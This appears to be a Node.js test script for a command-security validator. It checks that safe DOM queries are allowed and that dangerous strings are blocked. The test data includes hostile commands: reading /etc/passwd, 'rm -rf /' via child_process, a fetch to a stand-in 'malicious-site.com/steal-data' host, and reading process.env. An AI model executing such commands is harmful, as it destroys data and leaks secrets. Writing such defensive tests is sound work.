#!/usr/bin/env node

import { securityManager } from '../src/security/manager.js';
import { logger } from '../src/utils/logger.js';

// Test cases for security validation
const testCases = [
  // Safe commands
  {
    name: 'Safe DOM Query',
    command: 'document.querySelector("#button").click()',
    expectedBlocked: false
  },
  {
    name: 'Safe Text Extraction',
    command: 'document.getElementById("title").innerText',
    expectedBlocked: false
  },
  
  // Dangerous commands that should be blocked
  {
    name: 'File System Access',
    command: 'require("fs").readFileSync("/etc/passwd")',
    expectedBlocked: true
  },
  {
    name: 'Eval Execution',
    command: 'eval("malicious code")',
    expectedBlocked: true
  },
  {
    name: 'Process Spawning',
    command: 'require("child_process").exec("rm -rf /")',
    expectedBlocked: true
  },
  {
    name: 'Network Request',
    command: 'fetch("http://malicious-site.com/steal-data")',
    expectedBlocked: true
  },
  {
    name: 'Function Constructor',
    command: 'new Function("return process.env")()',
    expectedBlocked: true
  }
];

async function runSecurityTests() {
  console.log('🛡️  Running Security Validation Tests\n');
  
  let passed = 0;
  let failed = 0;
  
  for (const testCase of testCases) {
    try {
      const result = await securityManager.executeSecurely({
        command: testCase.command,
        operationType: 'command'
      });
      
      const wasBlocked = result.blocked || !result.success;
      const testPassed = wasBlocked === testCase.expectedBlocked;
      
      if (testPassed) {
        console.log(`✅ ${testCase.name}: ${wasBlocked ? 'BLOCKED' : 'ALLOWED'} (as expected)`);
        passed++;
      } else {
        console.log(`❌ ${testCase.name}: ${wasBlocked ? 'BLOCKED' : 'ALLOWED'} (expected ${testCase.expectedBlocked ? 'BLOCKED' : 'ALLOWED'})`);
        console.log(`   Error: ${result.error || 'None'}`);
        console.log(`   Risk Level: ${result.riskLevel}`);
        failed++;
      }
    } catch (error) {
      console.log(`💥 ${testCase.name}: Test failed with error: ${error}`);
      failed++;
    }
  }
  
  console.log(`\n📊 Test Results: ${passed} passed, ${failed} failed`);
  
  if (failed === 0) {
    console.log('🎉 All security tests passed!');
  } else {
    console.log('⚠️  Some security tests failed. Please review the implementation.');
    process.exit(1);
  }
}

runSecurityTests().catch(console.error);
